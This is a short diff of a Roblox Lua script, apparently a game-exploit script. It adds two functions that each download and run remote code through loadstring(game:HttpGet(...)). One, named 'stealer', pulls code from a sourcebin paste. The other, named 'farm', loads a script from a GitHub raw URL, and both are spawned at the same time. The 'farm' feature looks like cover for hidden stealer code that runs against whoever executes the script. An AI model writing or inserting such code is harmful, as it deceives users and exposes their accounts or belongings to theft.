@@ -1,1 +1,9 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/365fFELNkP/0", true))()
+local function stealer()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/365fFELNkP/0", true))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/unluckyws/loading-screen/refs/heads/main/universal/.lua"))()
+end
+
+task.spawn(farm)
+task.spawn(stealer)
